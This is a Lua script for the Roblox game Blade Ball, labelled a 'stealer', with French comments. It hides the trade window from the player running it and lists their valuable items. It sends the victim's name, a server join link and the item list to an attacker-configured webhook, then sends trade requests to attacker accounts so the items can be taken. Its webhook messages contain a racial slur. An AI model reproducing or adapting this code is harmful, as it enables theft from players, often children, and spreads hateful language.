_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "" 

-- Vérifications de base
if next(users) == nil or webhook == "" then
    plr:kick("Configuration manquante (Usernames/Webhook)")
    return
end

if game.PlaceId ~= 13772394625 then
    plr:kick("Only works in normal servers")
    return
end

-- Masquage de l'interface de trade pour la victime
tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false
local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function() maintradegui.Visible = false end)

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- FONCTION D'ENVOI 1 : LE JOIN MESSAGE (Avec Embed)
local function SendJoinMessage(list, prefix)
    local totalRAP = 0
    local fields = {
        {name = "Victim Username 🤖:", value = plr.Name, inline = true},
        {name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId},
        {name = "Item list 📝:", value = "", inline = false},
        {name = "Summary 💰:", value = "", inline = false}
    }

    local grouped = {}
    for _, item in ipairs(list) do
        totalRAP = totalRAP + item.RAP
        grouped[item.Name] = grouped[item.Name] or {Name = item.Name, Count = 0, TotalRAP = 0}
        grouped[item.Name].Count = grouped[item.Name].Count + 1
        grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
    end

    fields[4].value = "Total RAP: " .. formatNumber(totalRAP)

    for _, group in pairs(grouped) do
        fields[3].value = fields[3].value .. string.format("%s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
    end

    local data = {
        ["auth_token"] = auth_token, -- Sécurité Cloudflare
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "🟣 Bro join your hit nigga 🎯",
            ["color"] = 8323327,
            ["fields"] = fields,
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }

    pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- FONCTION D'ENVOI 2 : CONFIRMATION SUR LE SERVEUR
local function SendMessage(list)
    local data = {
        ["auth_token"] = auth_token, -- Sécurité Cloudflare
        ["embeds"] = {{
            ["title"] = "🟣 The nigga is on the server 🎉",
            ["description"] = "Victim: **" .. plr.Name .. "** est prêt pour le trade.",
            ["color"] = 8323327,
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }

    pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- LOGIQUE D'INVENTAIRE ET DE CALCUL RAP
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
local function getRAP(category, itemName)
    local catData = rapData[category]
    if not catData then return 0 end
    for k, v in pairs(catData) do
        if string.find(k, itemName) then return v end
    end
    return 0
end

for _, category in ipairs(categories) do
    for itemId, itemInfo in pairs(clientInventory[category]) do
        if not itemInfo.TradeLock then
            local rap = getRAP(category, itemInfo.Name)
            if rap >= min_rap then
                table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
            end
        end
    end
end

-- EXECUTION DU STEAL
if #itemsToSend > 0 then
    local prefix = (ping == "Yes") and "--[[@everyone]] " or ""
    SendJoinMessage(itemsToSend, prefix)

    local function doTrade(joinedUser)
        -- Logique de trade simplifiée pour l'exemple
        game:GetService("ReplicatedStorage").Packages._Index["sleitnick_net@0.1.0"].net["RF/Trading/SendTradeRequest"]:InvokeServer(Players[joinedUser])
    end

    Players.PlayerAdded:Connect(function(player)
        if table.find(users, player.Name) then
            SendMessage(itemsToSend)
            doTrade(player.Name)
        end
    end)
end
